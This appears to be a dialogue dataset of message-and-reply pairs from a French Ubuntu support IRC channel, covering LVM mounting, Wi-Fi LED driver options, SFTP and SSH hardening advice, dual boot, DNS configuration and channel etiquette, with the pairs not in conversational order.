je précise que cela est apparu après le changement d'utilisateur,   je ne connais pas les lignes de commandes pour aller voir les permissions dans Soundjuicer	regarde plutot où soundjuicer tente d'enregistrer, et ensuite va verifier les permissions à cet endroit, ca se fait avec "ls -l" : https://doc.ubuntu-fr.org/permissions
regarde plutot où soundjuicer tente d'enregistrer, et ensuite va verifier les permissions à cet endroit, ca se fait avec "ls -l" : https://doc.ubuntu-fr.org/permissions	dans préferences à la ligne  dossier de musique il ya  "aucun"
letho : Pose directement ta question, si quelqu'un peut/veut y répondre, il/elle le fera	je regarde ou dans soundjuicer  les préferences ?
Parceque mon locale c'est FR_CA	Tu peux modifier ça en tapant sudo dpkg-reconfigure locales
Tu peux modifier ça en tapant sudo dpkg-reconfigure locales	ça me laisse pas changer le locale. ça regénères seulement
@yakaar, j'ai déjà eu ce problème, essaye de commenter des dépots perso, et refait un apt-get update, pour voir.	c'est fais, mais le problème persiste
ça le deviendra :)	pardon :) par contre tu voulais dire l'applience plutot
Oui, pour les backups, je vais réfléchir à une autre solution. Mais pour les data, je vais le garder. Et donc besoin que LVM refonctionne correctement	pour tes datas aussi tu augmentes le risque de perte sèche :)
Oui éteint, dsl. Pas de WOL en plus. :( obliger d'attendre ce soir, duc oup...	en tout cas, je t'invite à ne pas agréger 2 disques externes en lvm
tes 60 disques ca doit bien te faire 10U avec l'onduler and co, la baie est déjà à moitié plaine	la baie fait 4U, et le courant ondulé vient d'ailleurs (il alimente toute la salle).
zfs ftw :p	zfs sur linux c'est pas trivial à mettre en place
zfs sur linux c'est pas trivial à mettre en place	indice: j'ai 2 filers de 60 disques avec zfs/debian
indice: j'ai 2 filers de 60 disques avec zfs/debian	heu on est pas sur #frsag ou #sysadmin ici :p
mais peut être que ça ne changera rien	regarder les logs c'est bien avant de sortir la grosse artillerie ^^
regarder les logs c'est bien avant de sortir la grosse artillerie ^^	bah c'est pas la grosse artillerie, ça :D
J'ai deux disques interne de data en lvm regroupé comme cela /mvg/Films et /mvg/Series et deux disques USB regroupé en un volume /mvgBackup. J'ai du déplacer mon poste, cela fait environ 3 4semaines de MAJ Ubuntu. Mais depuis, LVM ne se lance plus au démarrage. Les disques ne se montent  plus. Je suis obligé de lancer manuellement la cmd vgchangbe -a y. Puuis de monter manuellement les HDD. Résultat, j'ai des scripts et applis q	les deux disque sont dans le même vg ?
Quelqu'un s'y connaitrais en LVM?	vas y
Je viens de rajouter un script dans /etc/init.d/lvm qui contient : #!/bin/sh  case "$1" in   start)     /sbin/vgscan     /sbin/vgchange -ay     ;;   stop)     /sbin/vgchange -an     ;;   restart|force-reload)     ;; esac  exit 0. Cela devrais executer lvm au démarrage.	tu cherches à faire quoi ?
Ce qui est bizarre, c'est que cela fonctionnais parfaitement avant de débranché et rebranché les HDD USB. Et la à chaque redémarrage, je doit taper la commande vgchange. Ce qui par ailleurs empeche mes scripts de démarrages de se lancer.	pourquoi du lvm sur un disque usb ?
Comment remedier à cela?	j'ai pas trop l'expérience de ça
/usr/share/doc/iptables/html du coup :)	désolé de pas avoir répondu et d'avoir juste trollé :)
désolé de pas avoir répondu et d'avoir juste trollé :)	Pas de soucis :) Ca fait du bien des fois ! Ahaha
Je trouve juste dommage de devoir apprendre la syntax par coeur	piti dit ca parce que le NAT peut etre considéré comme le point de blocage qui empeche l'adoption de l'IPv6, c'est un quick fix qui a trop duré, à fait des degats et continue à en faire
piti dit ca parce que le NAT peut etre considéré comme le point de blocage qui empeche l'adoption de l'IPv6, c'est un quick fix qui a trop duré, à fait des degats et continue à en faire	Ah ok, je comprends la remarque. Mais du coup ça ne m'aide pas trop pour ma question ? Quelqu'un aurait une idée ?
on devrait pas plutôt décertifier quelqu'un pour avoir appris à mettre en place des NAT ?	Pourquoi tu dis ça ?
Un virus très tenace...	tiens, (5 sec sur google ;p ) https://tweakhound.com/2013/01/02/how-to-resize-your-windows-8-partition/
Windows 8	dans le gestionnaire de disques
Je viens d'essayer mais une petite fenêtre est apparue signalant une erreur, en fait je pense que la partition ntfs est vérouillé, car il y a un symbole de clé juste avant l'entré de la partition dans Gparted	tu peux shrink depuis windows de tete
j'ai un souci avec ma corbeille, quand je la vide ça m'ouvre une fenetre avec nautilus (ubuntu 15.04 et unity)	c'est pas toi qui avait déja eu ça, y'a quelques temps ?..
bonjour tout le monde, je viens vers vous car j'ai un problème mineur en dual boot (w7/mint) avec cette erreur au démarrage de mint: ne trouve pas la cde gfxmode.	ici, c'est ubuntu, pas mint
et l'actuelle LTS, c'est 14.04	c'est le retour du futur lol il peut nous apprendre des choses sur la 16.04 ça évite de se taper l'UDS et un article de blog pour le codename
La question est  : vous utilisez quoi? j avais des problemes de freezes aléatoire sur 15.04, de compatibilité sur 15.10, et de wifi sur 16.04...	15.10 et 16.04 sont juste pas sorti, c'est normal
Question con, J'aime bcp Ubuntu, surtout Gnome, mais j'ai vraiment l impression que toutes les versions qui sortent sont versions beta et non "stable release" comme on pourrait l'attendre d un programme Open source.	tu peux te contenter des versions lts
Je cherche à me connecter à une machine distante via ssh, depuis cette machine à télécharger un fichier via ftp et à le récupérer sur ma propre machine. Est-ce que c'est possible de le faire en une seule étape ? Sans stocker le fichier sur la machine intermédiaire	serveur ftp en mode actif ou passif ?
serveur ftp en mode actif ou passif ?	une idée ?
Marmotte : Je n'ai pas vu ton message, je ne sais pas la raison par contre. J'utilisais l'applet freenode.	pas de souci :)
a partir de windows seven ont a plus de mbr normalement ?	ben si tu n'es pas sur une machine EFI, c'est toujours MBR
=)	lsb_release
Salut, dites moi, est ce que c'est normal que l'espace disque libre sur mon / varie énormément? genre parfois j'ai 2.8Go de libre et des fois 3.5Go ?	peut être que ton /tmp est sur cette partition, et que tu utilises des applications qui y mettent beaucoup de données
vv	c'est un chan fr ici, on ne cause pas english :)
d'autres idées de distribs légère ?	passe sur #ubuntu-fr-offtopic pour ce genre de question, ca n'a rien à voir avec du support ubuntu
ls -ld /data/host1 ?	Je remarque que si je chown avec l'id 1000 sur /data/host1 ça fonctionne
Je vais tester lxDebian	tu arrives à faire live USB ? Tu utilise quoi pour le réaliser ?
On m'a recommandé Slitaz sur un autre chat, je vais d'abord l'essayer...	Breith ? :p
ton iso est pas bootable alors	j'utilise l'iso http://sourceforge.net/projects/multisystem/
(c'est un exemple)	il l'a déjà ce label
déjà, fait un ctrl-alt-f1 et tente de te logguer sur une console, comme ca a été suggéré plus haut	j'y suis en console
non	pour le wif-fi, tu peux utiliser wicd (sudo aptitude install wicd)
j'y suis là batden	est-ce que tu peux te connecter à ton compte utilisateur en passant par Ctrl-Alt-F1 ?
est-ce que tu peux te connecter à ton compte utilisateur en passant par Ctrl-Alt-F1 ?	effacer ~/.Xauthority n'a servi à rien. Mon pb reste le même.
en live session, tu effaces .Xauthority	puis efface  ~/.Xauthority en démarrant via ctrl+halt+F1 ?
quelqu'un-e aurait-il-elle une idée matinale svp?	essaie de supprimer le fichier ~/.Xauthority de ton home (à partir d'un live cd)
essaie de supprimer le fichier ~/.Xauthority de ton home (à partir d'un live cd)	et bien-sûr, je n'ai pas de live cd :-(
PurinaProPlan ?	?
ils ont l'air vieux, ses packages	tu es la ??j arrive pas
tu es la ??j arrive pas	tu peux toujours commenter ce dépôt
comment faire pour que je puisse installer a nouveau des logiciels	ce n'est pas moi qui t'ai répondu
la page est sense m aider en quoi	?
j'ai ces 2 ligne la dans le même lsusb	je pas compris
ca c'est clairement des choses qui sortent de /proc/bus/usb … après, est ce que c'est juste une info du bus ou un parametre modifiable, je n'en ai pas la moindre idée	 c'est modifiable a mon avis car ça fonctionnait bien avant
et ce ne serait pas la premiere fois qu'un constructeur moisi "vole" des usb-id à quelqu'un d'autre	non c'est le bon fabricant
deadrats merci	c'est surtout un fichier maintenu à jour par le projet linux-usb: http://www.linux-usb.org/usb-ids.html
de quel fichier de conf (si c'est le cas) sont tirer les informations de la commande: lsusb -v -d 0c45:7403	"man lsusb" indique /var/lib/usbutils/usb.ids
de l aide svp	 sudo apt...
ben Docker marche très bien sous GNU/Linux aussi...	https://github.com/facebook/nuclide :)
https://github.com/facebook/nuclide :)	ça reste propriétaire, regarde la licence
pas de Flash à jour non plus. c'est à peu près tout, tout le reste est possible	de toute facon on sait tous qu'Adobe, c'est de la daube :)
svp j ai modifiier ma sourcelist et je n arrive plus a installer ni a mettre a jour mon systeme	plus précisément https://doc.ubuntu-fr.org/depots_trusty
bonjour	tu as consulté https://doc.ubuntu-fr.org/depots  ?
et la ça bloque, je n'arrive pas a créer un alias qui fait ça	moi je pourrais pas trop te répondre mais wait and see, des gens plus qualifié ici vont certainement te répondre
bonjour	bonjour
Je viens de redémarer, savez vous comment je pourait regler sa ?	http://askubuntu.com/questions/639679/cant-purge-nvidia-331-updates .
en fait, pour défaire: echo phy0tpt | sudo tee /sys/class/leds/phy0-led/trigger	Je le retiens.
Je le retiens.	tu as encore "options iwlwifi led_mode=1" dans ton /etc/modprobe.d/iwlwifi.conf ?
tu as encore "options iwlwifi led_mode=1" dans ton /etc/modprobe.d/iwlwifi.conf ?	Comme il ne servait pas, je l'ai retiré.
Comme il ne servait pas, je l'ai retiré.	moi je soupçonne /usr/share/acpi-support/state-funcs
le premier mot de cette liste	Oui.
c'est pas mmc0	"none AC-online BAT0-charging-or-full BAT0-charging BAT0-full BAT0-charging-blink-full-solid usb-gadget usb-host cpu0 cpu1 cpu2 cpu3 mmc0 rfkill0 rfkill1 rfkill2 rfkill3 phy0rx phy0tx phy0assoc phy0radio [phy0tpt] ".
"none AC-online BAT0-charging-or-full BAT0-charging BAT0-full BAT0-charging-blink-full-solid usb-gadget usb-host cpu0 cpu1 cpu2 cpu3 mmc0 rfkill0 rfkill1 rfkill2 rfkill3 phy0rx phy0tx phy0assoc phy0radio [phy0tpt] ".	echo none | sudo tee /sys/class/leds/phy0-led/trigger
echo none | sudo tee /sys/class/leds/phy0-led/trigger	Ca a déplacé les [ ] dans le fichier. Je pense qu'il faut redémarrer ensuite.
ça doit etre dans phy0-led	Les 2 dossiers contiennent les mêmes dossiers: device, power, subsystem et les fichiers: brightness, max_brightness, trigger et uevent. Par contre,le contenu des sous-dossiers est différents.
Les 2 dossiers contiennent les mêmes dossiers: device, power, subsystem et les fichiers: brightness, max_brightness, trigger et uevent. Par contre,le contenu des sous-dossiers est différents.	cat /sys/class/leds/phy0-led/trigger
Une autre question. Je n'ai pas trouvé avec quel utilitaire vérifier un sha256 d'une iso qu'on télécharge. Car par défaut, je n'ai pas cette commande.	ma led aussi ne s'éteint pas
ma led aussi ne s'éteint pas	Oui, mais moi, elle fonctionnait correctement avant de recevoir des mises à jour il y a 2-3 semaines...
Oui, mais moi, elle fonctionnait correctement avant de recevoir des mises à jour il y a 2-3 semaines...	peut être c'est mon cas aussi, je n'ai pas fait gaffe si la led fonctionnait correctement avant
dmesg clache ?	J'ai booté il y a plusieurs heures, mais en faisant un grep sur une partie du nom du fichier, je le trouve avec une indication "[   10.675128] iwlwifi 0000:06:00.0: can't disable ASPM; OS doesn't have ASPM control".
:(	Pour la led de l'interrupteur wireless, ça n'a pas marché, j'ai testé toutes les possibilités de valeur, aussi bien dans iwlwifi.conf que wlan.conf .
devilspie a l'air bien malin lui aussi :-) merci clache	De rien, c'est avelldiroll qui me l'a fait connaître... ;-)
Là je vois un paramètre "Chevauchement de manipulations de sorties" : ça pourrait être ça ?	Dans le pire des cas, https://doc.ubuntu-fr.org/devilspie fait des miracles.
hihi on dirait l'éditeur de registre windows, mais tout de même en moins ésotérique	Le plus simple est de noter les modifications au fur et à mesure dans un fichier, tu peux ainsi les reproduire après une réinstallation.
comment faire pour qu'elles s'ouvrent au premier plan, "normalement" ?	Avec quelle variante?
Sur une autre session, je me log dans un terminal avec le login et le mot de passe de la session en panne.	Je pense à unity cassé.
Je me connecte normalement avec le terminal sur une autre session	Les raccourci clavier marche pour que tu puisses ouvrir un terminal? Ou tu parles d'une console?
Le mot de passe est accepté mais la page d'accueil reste figé.	Tu peux tenter "unity --reset" qui remet tout à 0.
Je ne parviens plus à me connecter sur ma session suite à la restauration de mon home.	Il y a plein de tutoriel sur comment le réinitialiser, mais on n'explique pas ce genre de choses ici.
Bonjour, apres	C'est le mot de passe qui est rejeté?
A noter qu'il peut être lancé avec les 3 paramètres d'un coup aussi, ou seulement 2, ou 1 seul...	peut être qu'il y a des indications dans man man
ça me parait plus simple	ok, merci
https://doc.ubuntu-fr.org/seahorse	ok, je jetterai un coup d'oeil
le truc c'est qu'il y a aussi seahorse qui peut en charger	ma clé est listée pourtant je ne l'ai pas chargée :(
J'ai essayé ssh-add -L mais il n'affiche que ma clé publique que je n'ai pas chargé dans ssh-agent	pourtant ssh-add -l ou -L liste les clefs chargées
Salut a tous , comment fonctionne les packages -dbg ? ou sont mis les symbols? comment sont-t-ils liées aux .so? example libxml2 et libxml2-dbg qui m'interssent	c'est hors sujet - essaie #ubuntu-fr-offtopic  ou des chans plus concernés
:(	C'était pour grammalecte. J'ai renommé le dossier et réinstallé l'extension(sans la retélécharger) et ça a marché. L'installation qui avait dû coincer.
 /etc/modprobe.d/iwlwifi.conf	La dernière fois qu'on s'est parlé, on avait cherché un truc pour moi, mais je ne sais plus lequel(pour te donner les infos complémentaires).
La dernière fois qu'on s'est parlé, on avait cherché un truc pour moi, mais je ne sais plus lequel(pour te donner les infos complémentaires).	aucune idée, ça doit remonter à longtemps
aucune idée, ça doit remonter à longtemps	Une semaine ou 2.
sinon le 3, si tu veux l'éteindre pour de bon	Ok.
c'est la valeur 1 qui est intéressante	Oui, c'est ce que je comprends.
wep	Entre autre, "parm:           led_mode:0=system default, 1=On(RF On)/Off(RF Off), 2=blinking, 3=Off (default: 0) (int)
ça donne quoi ton probleme avec Ubuntu drhelmut	Au fait, mon histoire de led de l'interrupteur wireless, ça ne venait pas du kernel, mais ce n'est pas résolu.
Au fait, mon histoire de led de l'interrupteur wireless, ça ne venait pas du kernel, mais ce n'est pas résolu.	et que sous Ubuntu le probleme ?
et que sous Ubuntu le probleme ?	Je n'ai que des lubuntus.
Je n'ai que des lubuntus.	un petit modinfo iwlwifi est tres instructif
t'as des modèles en bas	Je regarde.
Je regarde.	dis moi ton modèle
dis moi ton modèle	Intel Corporation WiFi Link 5100.
Intel Corporation WiFi Link 5100.	https://blog.al4.co.nz/2012/05/intel-wifi-led-blinking-again-on-ubuntu-12-04/
https://blog.al4.co.nz/2012/05/intel-wifi-led-blinking-again-on-ubuntu-12-04/	Je testerais le truc, sauf que moi, elle ne clignote pas, elle reste allumé même quand j'éteins la carte.
Je testerais le truc, sauf que moi, elle ne clignote pas, elle reste allumé même quand j'éteins la carte.	bah je sais pas, peut etre qu'elle clignote 25 fois par seconde, l'oeil ne le discernera pas
bah je sais pas, peut etre qu'elle clignote 25 fois par seconde, l'oeil ne le discernera pas	Tout marchait correctement sur ma 14.10 jusqu'au 10 juin environ, sûrement suite à une mise à jour, la led est constamment allumé. J'ai installé 15.10 à la même date et elle avait le bug.
Tout marchait correctement sur ma 14.10 jusqu'au 10 juin environ, sûrement suite à une mise à jour, la led est constamment allumé. J'ai installé 15.10 à la même date et elle avait le bug.	fais un lsmod | grep iwl
fais un lsmod | grep iwl	J'utilise iwlwifi.
oui, helmut c'est plutot allemand ça non et on sait que les allemands nous espionnent pour le compte des américains	C'est une régression, la led fonctionnait comme il faut au début. Par contre, l'interrupteur est bon.
C'est une régression, la led fonctionnait comme il faut au début. Par contre, l'interrupteur est bon.	t'es sûr que la led n'est pas morte ?
t'es sûr que la led n'est pas morte ?	C'est l'inverse, elle ne s'éteint plus...
C'est l'inverse, elle ne s'éteint plus...	c'est peut etre ça
bonsoir à tous, je voudrais savoir s'il est possible d'avoir i3wm sous xubuntu xfce ? et si vous avez de la doc pour l'installer et le configurer ?	Installer i3, oui, il est dans les dépôts, mais je n'ai pas de documentation.
Installer i3, oui, il est dans les dépôts, mais je n'ai pas de documentation.	d'accord, je vais essayé juste pour voir par curiosité
ton hardware peut etre clache	pour un espion il est relativement à découvert si tu vois ce que je veux dire :), clache mince :/
que dis je de la documentation dokuwiki machin :)	tu parles de ça? https://doc.ubuntu-fr.org/utilisateurs/beaver
ah mal lu désolé^^	mez<touche completion>
s/le/la	c'etait quoi ?
j'suis sur la page de plymouth, apparemment c'est un probleme courant	ça veut dire quoi me co ?
!wiki vbeinfo	http://doc.ubuntu-fr.org/plymouth
Possible de m'expliquer ?	un début de réponse, pour pas dire LA réponse
!wiki ath	http://doc.ubuntu-fr.org/wifi_atheros_ar9285 | http://doc.ubuntu-fr.org/unity | http://doc.ubuntu-fr.org/atheros_ar5007eg | http://doc.ubuntu-fr.org/wifi_atheros | http://doc.ubuntu-fr.org/dell_xps_m1340
(et à priori, les autres non plus)	un portsentry en supplément si t'es joueur :D
c'est automatisé, justement, comme tu viens de le dire :)	le bot moyen ne scan pas tes 65535 ports :)
le bot moyen ne scan pas tes 65535 ports :)	le bot moyen n'a pas ma clé SSH :D
http://192.168.0.5/index.phpMais rien avec:http://lin-pat-web-u1204/index.php??? Je merde encore...	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
probleme résolu	euh... changer le port SSH, ça ne sert à rien
Promis, je m'y intéresserai quand le serveur sera en France, et non à 50 centimètres.	pour le compte root, dans /etc/ssh/sshd_config, tu peux désactiver le log direct en root, et virer l'auth par password
et pas besoin du bac pour s'en servir, il faut avoir du temps par contre, enfin s'accorder le temps de se former dessus, comme tout outil un peu complexe	un sémaphore c'est déjà pas mal, je pensais à des pots de yaourt relié par câble nylon
(Que j'appliquerai le moment venu)	c'est juste que prendre le temps d'apprendre à se servir de git fait gagner beaucoup de temps au final … et git n'a rien à voir avec cvs, c'est comme comparer un semaphore avec un smartphone
Pour le maintient d'un site distant, par exemple ?	tu crée un depot git sur ta machine, un dossier dans lequel tu peux entregistrer l'etat à un instant t (et accessoirement pouvoir revenir en arriere, travailler sur plusieurs etats differents en parallele …)
Je ne vois pas ce que vous cherchez à me dire...	non, pas pour les paquets, pour ton code
Ça semble être "dpkg"...	ssh tourne sur le 22 pas le 21, par consequence sftp tourne sur le 22
ssh tourne sur le 22 pas le 21, par consequence sftp tourne sur le 22	merci !
voilà :D	pour revenir sur nfs on lan … nfs n'a jamais été conçu pour le wan, y a pas assez de secu dans le protocole pour envisager de l'exposer au wan, au delà du fait que nfs a besoin d'un reseau relativement stable pour bien se comporter, il est innenvisageable de l'exposer au wan, à moins de le faire passer dans un vpn, mais un vpn ca reste une emulation de lan entre deux points
Oui. À travers le réseau.	il y a un client en console "sftp"
Ou même Git ?	ca veut dire aller jeter un oeil sur ce que dit le web et wikipedia sur le sujet et revenir poser des questions ici si tu en as
+1 pour git :)	je ne vais pas expliquer pourquoi pas de NFS hors d'un LAN sur ce salon, ce serait trop violent, il y aurait des morts
Pas de problème de sécuritñé, avec NFS ?	definitevement sftp, la plus part des clients ftp serieux supportent sftp, mais de maniere generale, je te conseillerai de jeter un oeil aux controlleurs de versions en general, et à git en particulier
mais chacun son truc	pas de nfs hors du LAN
Je cherche à me connecter ftp depuis l'équivalent "nqautilus" de mon système, pour développer une app Web.	tu es le seul utilisateur du ftp en question ? pourquoi ftp et pas sftp (le ftp c'est pour du one-to-many public, pas du one-to-one privé) ?
avelldiroll  OK. Je te suis sur ton choix. Que me conseilles-tu, ou qu'utilise tu ?	commece par decrire ce que tu cherches à faire exactement, pour l'instant j'ai juste essayé de deviner, mais si tu veux mon avis, il faut me parler de la finalité
ah mais tu fais ce que tu veux :)	+1 pour le sfto only intégré dans openssh-server :)
(à ne pas confondre avec le ftps)	OK. J'ai suivi la page http://doc.ubuntu-fr.org/mysecureshell_sftp-server et installer ftp ssh
Pas de démont xxxftpd...	les connexions ssh en root, c'est souvent laissé à l'installation sur ubuntu, libre à chacun de le changer, sous ubuntu par defaut, le compte n'a pas de mot de passe, donc une connexion par mot de passe dessus est impossible
tu peux te déplacer dedans avec les flèches haut/bas, et quitter avec la lettre q	Merci, Je vois voir ce qu'il y a en *ftp*...
Comment savoir ce qui est installé / fonctionnel en général, sur Ubuntu, une ne sorte de commande "query" à apt, en quelques sorte ?	pour connaitre la liste des paquets installés, tu peux faire quelque chose comme "dpkg -l | grep ^ii"
c'est mal ?	sur un server oui, enfin ca veut dire que tu deviens responsable de l'audit de secu de ce service sur cette machine, ainsi qu'un suivi de maintenance non-standard, sans test prefournit par les outils de monitoring
debian *	je suis sur 14.04.2, et je viens de tester en créant un virtualenv vide, puis en lançant "pip install pycrypto" dedans, et tout s'est déroulé tout seul sans erreur
àdatabase file oui je crois	tu as essayé dbview ?
(tu peux parler)	personnellement je préfère le charbon … mais bon …
(une blague que seuls les plus de 35 ans peuvent comprendre)	:p
je fais cet effort pour le confort des lecteurs, toi aucun	agassi ?
vous savez a quelle point sa peux faire mal se que vous écriver sur les autres , moi je fait le mieux que je peut pour écrire , je sais c'est comme moi je l'écriré paraport au sont que je comprent des mots , je sais que sa peut étre dur a lire mais jpe pas faire mieux .	ça passerait mieux si on etait en chat vocal mais là, non
y'en a un qui poste depuis quelque jours … j'y perds un oeuil à chaque fois ᒃ⁔ᒄ	mon favori c'est ghosty :)
(je change de salon ;) )	haha
je ne sais pas comment faire pour écrire en sms. meme sur un sms	http://www.tusors.fr/
snon cmmt va le mnde ?	le troll c'est sur #ubuntu-fr-offtopic
*trafic	oui t'as raison sur ce point là
oui t'as raison sur ce point là	par contre, il ne faut pas hésiter à reprendre ou à /ignore
grave	o/
genre au bout du 3eme avertissement, un +q d'une heure, ça soulage la conscience	ça reste un salon de support, et il n'y a pas la densité de traffic pour justifier ça
le grand classique, quelqu'un qui ne prend pas le temps de soigner sa rédaction, c'est qu'il ne veut pas être lu	c'est clair
(et puis d'abord on dit photeux)	j'aimerai bien qu'on puisse mettre en +q les gens qui continuent à écrire du sms ici
test	pong
hé non, :)	->[]
et même OS X	mais pas ubuntu ?
unetbootin c pour windows aussi non ? j'ai qu'un pc sous ubuntu moi	oui, UNetbootin tourne sous Windows
je cherche des infos pour un portable compatible linux neuf ou d'occasion. Merci	il y a déjà pleins de modèles référencés sur https://doc.ubuntu-fr.org ou https://wiki.ubuntu.com à ce sujet :)
il donne pas adresse email	merci, bon ça coince la aussi.
Sinon essaye depuis tor, non ?	Tor :  http://doc.ubuntu-fr.org/tor me semble compliqué
pour les emails c'est sur http://aide.voyages-sncf.com/contactez-nous/email http://aide.voyages-sncf.com/contactez-nous/email	les 2 sites me sont pas accéssibles
mais c'est vrai que ça ressemble à ils t'ont ban de leur site, si c'est un portable essaye d'un wifi autre que le tiens (genre freewifi ou celui d'un ami)	je vais contacter la SNCF !
(le site est down	mon cas est désespéré, j'ai bien l'impression
pouvoir lire les doner d'un ordi a partir de l'autre et inversement	cherches samba ou smb sur la doc
salut je vouler savoir es que peut conécter un pc windows 7 et un pc Unbuntu studio via une livebox sachant que le pc windows est conécter par cable rj 45 et que le pc ubuntu lui est conécter en Wifi	tu pourrais faire un peu d'efforts sur l'orthographe, s'il te plait ?
alors	firefox a tourné dans le vide sans laisser de message
@+	de retour après redémarrage ordinateur
dr ultra20	J'ai désactivé le réseau même réponse
ultra20 va voir ce lien http://www.google.fr/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CCUQFjAA&url=http%3A0.0000000.000000www.clapico.com0.00000020120.000000060.000000230.000000hotspot0.000000&ei=iQ2IVcbRDYG2UtyJgPAI&usg=AFQjCNGxb9dXB-l-KewAcPSPR-fo7wrZzw&sig2=ZKmwBMWUsZ0ssLQ2T6o5Zw&bvm=bv.96339352,d.d24	sudo service dnsmasq restart donne Failed to restart dnsmasq.service: Unit dnsmasq.service failed to load: No such file or directory.
isaric	je ne sais maintenant plus quoi tester et parfois je casse moins ainsi !
tant que tu peux y aller par ton navigateur c'est bon :)	family, en tout cas merci
amha juste cette machine doit juste etre un Vhost, qui ne répond pas au ping	depuis j'ai encore trifouillé et essayé de noter http://isaric.cof.free.fr/test/traceroute.txt
pas besoin de compiler ...	family , j'ai noté les test réalisées là :  http://isaric.cof.free.fr/test/traceroute.txt
et essaye d'aller sur 90.80.158.136 avec firefox	Forbidden
et un ping	je mets quoi derrière ping http://www.voyages-sncf.com/ ?
ping	j'ai mis la réponse de trace route sur le bas du podt http://forum.ubuntu-fr.org/viewtopic.php?pid=20060101#p20060101
d'accord je m'occupe de toi en privé	pas de pv dans ce chan
bonsoir a tous	merci pour le lien , j'ai déjà consulté ce wiki, c'est trop imprécis sur la création des dossiers de roms système
là je m'adresse vraiment aux joueurs rétro	je te conseille de demander sur le canal #lutris
1to -> windowsd	donc sur ta clé t'as quoi? windows ?
non je veut mettre windows en dualboot mais j'ai l'impression que c'est ubuntu qui me casse les couilles je pense	ah t'as déjà ubuntu mais tu veux installer windows ? en général on fait l'inverse, on installe ubuntu en dernier
j'ai deja ubuntu	tu as mis ubuntu version internationale sur ta clé ?.
au pire je vais tanter des trucs chelou mdr	non c'est dans les paramètres du bios
non c'est dans les paramètres du bios	sur le bios asus j'ai juste uefi et legacy j'ai mis en legacy la déjà faut que je vérifie le secure boot ( faut deja le trouver )
sur le bios asus j'ai juste uefi et legacy j'ai mis en legacy la déjà faut que je vérifie le secure boot ( faut deja le trouver )	c'est bon, secure boot c'est uefi
faut que je le recherche. Bios graphique a deux balle de asus :(	car sinon, il te faudra la version qui supporte l'uefi, la version internationale 64 bits il me semble
redemarer maintenant	j'ai pas du tout ca ^^ j'ai que ubuntu
j'ai mis en legacy et ca change rien	désactive le secure boot dans le bios
pour une fois si jpe aider je pensse avoir ta reponse	j'ai plus windows 8 justement j'ai que ubuntu et depuis sa bloque :(
(soit configurer le NAT)	oui très récent meme je l'est monté ya moin de 2 mois ^^
redirige vers mon adresse ip , celle de la box , puis vers l ip du reseau local de la machine qui heberge le site	il faut que l'IP correspond au nom de domaine soit l'IP WAN (externe) de ta box, oui
j'essaye de me faire un dual boot pour avoir ubuntu et windows mais impossible de boot sur la clé usb, j'ai essayer la methode classque format + flag boot + copie des fichier j'ai essayer aussi avec multisystem mais rien de fonctionne :(	c'est un PC récent ? si non, es-tu certain qu'il peut booter sur USB ?
en passant, je les trouver	Donc, si tu as un .desktop mais que l'entrée n'est pas dans le menu, il faut modifier le fichier avec les droits. Ca devrait être le paramètre Categories qui n'a pas ce que tu souhaites.
effacer les noyau inutile, pourquoi plusieurs noyau quand j'peut en garder juste 2	Virer des noyaux, je préfère le faire à la main. Et on ne peut pas dire qu'un ancien noyau est inutile.
sa m'est utile pour faire du ménage après mise à jour	Quel ménage?
re ghosty :D	Et comment fais-tu pour ouvrir cette fenêtre? Je l'ai déjà vu, mais ne me souvient plus comment, car je l'estime inutile. Regarde dans le dossier /usr/share/applications , Paramètres Système doit déjà avoir son fichier. Par contre, je me demande ce que tu fais avec Ubuntu Tweak...
ba peut importe le 32 bits ou le 64 bits le feron aussi bien l'un que l'autre	tu m'as menti en fait
musiqsue et video c'est juste pour les lire ou tu conte crée	juste pour lire
encore mieux clache : http://pix.toile-libre.org/upload/original/1434830587.png	Le transfert, ça marche moyen.
je sais pas justement.....	Tu vas en avoir besoin pour créer le lanceur... Comment l'ouvres-tu?
le Lubuntu Control Center	C'est quoi la commande?
ok merci clache	Par contre, je me demande ce que tu appelles "Paramètres Système".
ok	En reprenant, la syntaxe de ces fichiers, tu pourras créer ton lanceur.
j'ai lubuntu 15.04 justement	Dans le dossier, tu as bien 'Notifications', pourtant il n'est pas dans le menu. C'est parce qu'il manque LXDE; à la ligne 94 OnlyShowIn=XFCE; .
j'me suis rajouter l'application MENU PRINCIPALE mais elle ne trouve pas	Quelle version as-tu? Je vais te donner l'exemple de l'application xfce4-notifyd-config. Tu peux voir quelle existe mais soit elle n'a pas son lanceur dans /usr/share/applications(version 14.10), soit celui-ci contient un 'bug'(version 15.04), ce qui fait qu'elle n'est pas dans le menu. Avec les droits, créer un .desktop dans ce dossier pour ton application.
mais moi sa fait que 3 semaine que suis sous linux	/join #ubuntu-fr-offtopic si tu veux l'y rejoindre ;)
27	je vais de ce pas dans le salon #ubuntu-fr-offtopic
oui, c'est vrai. Tu as quel âge ?	ici c'est un canal de support, pas de discussion, si tu veux discuter va sur #ubuntu-fr-offtopic
ok merci ghosty pour l'astuce	Tu peux créer un .desktop .
dns-servernames 192....	c'est juste pour définir les serveurs DNS à utiliser pour le réseau lié à cette interface
et franchement pourquoi faut il rajouter dns-nameservers puis l adresse de la livebos	quand tu veux accéder à un serveur, plutôt que de retenir plein d'adresses IP, tu retiens un nom
alors Marmotte > ...... J ai juste rajouter dns-nameservers 192.168.1.1 dans le fichier interface et ca fonctionne	le principale, c'est que tu aies compris ce qui clochait :)
salut Marmotte , ça va ?	très bien, mais c'est ot comme question :D
Marmotte > pour que je me couche moins bete ce soir , que devrais je avoir d'inscrit dans ce fichier ?	dans la configuration de ton interface dans /etc/network/interfaces ajoute une ligne "dns-nameservers 192.168.1.1" (ta livebox)
ben les requete ping fonctionnes , mais on dirais juste en local je n arrive pas a sortir sur le reseau	essaie un ping sur une machine distante
c'est quoi un ping	c'est une commande qui envoie un paquet, et attend une réponse
j'imagine que j'ai ommis un detail tout bete , mais la j'avoue que je ne vois pas et ca m'eviterai de chercher toute la fin d'apres midi	pas vraiment lié à ta question, mais à noter au passage
enfin je pense	C'est une autre solution.
C'est une autre solution.	merci pour ton aide
dépouiller ?	Oui, apparemment, l'installation a besoin d'un écran et d'une souris. Mais après, tu pourras t'en passer.
l'ordinateur démarre sans problème sans clavier ? :s	Prendre l'écran et le clavier.
donc ça va ...	Je ne l'ai jamais fait par contre. Mais le temps de l'installation, tu peux dépouiller ton ordinateur, ce sera peut être plus simple.
clavier*	Tu visualiseras tout dans un terminal.
